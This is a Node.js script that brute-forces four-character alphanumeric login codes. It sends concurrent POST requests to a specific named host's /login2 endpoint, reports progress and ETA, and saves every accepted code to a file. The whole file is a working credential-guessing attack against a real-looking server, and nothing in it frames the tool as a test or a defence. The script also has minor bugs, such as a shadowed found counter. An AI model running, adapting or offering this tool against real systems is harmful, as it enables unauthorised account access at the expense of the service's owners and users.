var request = require('request'),
    randomstring = require("randomstring"),
    fs = require('fs');

var file,
    begin,
    found = 0,
    counter = 0,
    failed = 0,
    connections = 20;

// Code Style
var cChars = "0123456789abcdefghijklmnopqrstuvwxyz",
    cLength = 4;

function doCode() {
    counter++;

    let code = counter.toString(36);

    while (code.length < cLength) {
        code = "0" + code;
    }

    if (counter % 40 === 0) {
        let nowT = new Date().valueOf();
        let timeNeeded = (nowT - begin) / 1000;
        let percentage = counter / Math.pow(cChars.length, cLength) * 100;
        let left = (Math.pow(cChars.length, cLength) - counter);
        console.log(
          "state: " + percentage.toFixed(2) + "% | checked: " + counter + " | " +
          "left: " + left + " | time-needed: " + timeNeeded.toFixed(2) + "s | " +
          "ETA: " + (counter / timeNeeded * (Math.pow(cChars.length, cLength) - counter)).toFixed(2) + "s | " +
          (counter / timeNeeded).toFixed(2) + " req/s | failed res: " + failed + " | found: " + found.toFixed(2)
        );
    }

    request({
        url: 'http://new.maxkl.de:8080/login2',
        json: true,
        body: {
            code: code
        },
        method: 'POST',

        headers: {
            "Accept": "application/x-www-form-urlencoded",
            "Content-Type": "application/json"
        }
    }, function(err, response, body) {
        if (err) {
            console.dir("invalid response: " + err);
            counter--;
            failed++;
        } else {
            var found = body.found;

            if (found) {
                console.log("found: " + code);
                file.write(code + "\n");
                found++;
            }
        }

        doCode();
    });
}

if (process.argv[2] !== undefined && process.argv[3] !== undefined) {
    counter = process.argv[3];
    connections = process.argv[2] - 1;
    var now = new Date();
    begin = now.valueOf();
    var date = now.getYear() + 1900 + "-" + now.getMonth() + "-" + now.getDate() + "_" + now.getHours() + "-" + now.getMinutes() + "-" + now.getSeconds();
    var file = fs.createWriteStream("founds_" + date + "_" + process.pid + ".txt", {
        flags: 'a',
        defaultEncoding: 'utf8',
        fd: null,
        autoClose: true
    });

    file.write("[" + new Date().toLocaleTimeString() + "]\n");

    for (var i = 1; i <= connections; i++) {
        doCode();
    }

} else {
    console.error("Usage: node app.js [connections] [start]");
    console.error("connections: connections at a time [20]");
    console.error("start: start index (useful for several processes) [0]");
}
